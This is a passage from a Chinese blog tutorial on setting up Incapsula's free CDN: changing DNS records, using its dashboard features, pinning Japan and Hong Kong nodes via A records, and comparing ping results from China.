5、你需要到你的域名DNS管理处，将域名的@的A记录修改为Incapsula给你的IP（一般有两个），域名的www的记录修改为Incapsula给你的CNAME记录。 6、完成了以上操作后，就可以点击完成设置，Incapsula检测到你的域名的DNS更新成功后，你就可以在Incapsula查处和管理你的CDN了。 二、Incapsula CDN管理面板使用 1、这是Incapsula CDN的管理后台，主要是可以查看CDN流量统计、安全、CDN性能、管理日志等（点击放大）。 2、在Incapsula的设置当中，你可以查看CDN的源服务器IP地址，如果你的服务器IP有变动，就可以在这里直接修改。 3、Incapsula还支持设置带www和不带www的域名跳转（利用这个功能，你不再需要在Htaccess中设置301跳转了）、是否显示推广广告、网站原DNS和CDN的DNS记录详情等，点击放大： 4、Incapsula有一个登录保护功能，这个功能对于那些有用户账号系统登录页面的网站来说，将可以有效地保护好账号的安全。 5、添加你想要使用Incapsula登录保护的页面的URL，然后用户在访问这个页面时需要授权了。 6、Incapsula还提供了CDN缓存模式可供选择：关闭、标准和进阶模式。 7、Incapsula还会通过对JS、CSS、Html等静态文件压缩，以达到加快页面加载的速度，你可以有选择性地关闭它们。 8、Incapsula还会有一些高级的CDN缓存设置，比如Http头的no-cache、Max-age、Last Modified等协议，你都可以在Incapsula中选择是否遵循。 三、Incapsula设置日本、香港CDN节点 1、Incapsula的CDN节点分布在香港、东京、新加坡、阿姆斯特丹、伦敦、阿什本、san jose、洛杉矶、特拉维夫、阿什维尔等地区，其中香港、东京是我们国内连接速度最快的主机机房位置。 2、一般来说我们会选择Incapsula香港或者日本的CDN节点作为我们网站的加速的CDN，而要做到这一点，我们只需要知道CDN的节点服务器IP就可以了。Incapsula所有的CDN节点IP地址可以在这里找到：http://bgp.he.net/AS19551#_prefixes 3、想要设置Incapsula日本、香港CDN节点，先要保证参考上面的方法操作，网站已经成功接入了Incapsula的CDN，然后再到你的域名DNS管理处，将原来的CNAME记录删除，把@和www等记录全部改为A记录，记录值是Incapsula的CDN节点的IP地址。 4、由于Incapsula的CDN节点有非常多的IP地址，我们可以多设置几个A记录。等DNS生效后，我们就能看到自己的网站访问到的Incapsula CDN节点已经变成了日本或者香港了。 四、Incapsula日本、香港、美国CDN加速效果比较 1、默认的我们在Incapsula添加自己的网站加速时，系统分给我们的是美国的Incapsula CDN加速节点，通过站长工具测试发现Incapsula的美国CDN服务器在国内连接状态还算不错，比较少丢包，Ping值一般在270-300之间。 2、Incapsula日本和香港的Ping情况差不多，丢包比较少，响应时间也差不多。 3、这是晚上测试Incapsula香港CDN节点的响应时间，平均在200左右。 4、这是白天测试Incapsula香港CDN节点的响应时间，平均在170左右。 5、Incapsula日本和香港的Ping测试结果显然不是很让满意，按照以往的经验日本和香港的Ping响应时间一般是在70以下。用路由追踪工具查看了一下国内连接Incapsula日本和香港的线路走势，电信用户是绕道日本后再到香港的。 6、联通用户访问也是一样，先到日本，再到香港。 五、Incapsula日本香港免费CDN使用小结 1、Incapsula与Cloudflare比较起来，可以不用修改NS，采用CNAME记录的方式就可以接入到CDN，方便不少。Incapsula 每个节点一个ip，未使用anycast技术，因此方便了我们根据自己 的需要来设置CDN节点的IP地址。 2、不过，从测试的结果来看，Incapsula日本香港免费CDN节点国内并不是直连，基本上都是绕道到美国或者日本，所以也就看到了日本和香港的Incapsula CDN使用效果差不多，有些美国线路情况比较好的CDN节点速度也很快。","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]}]}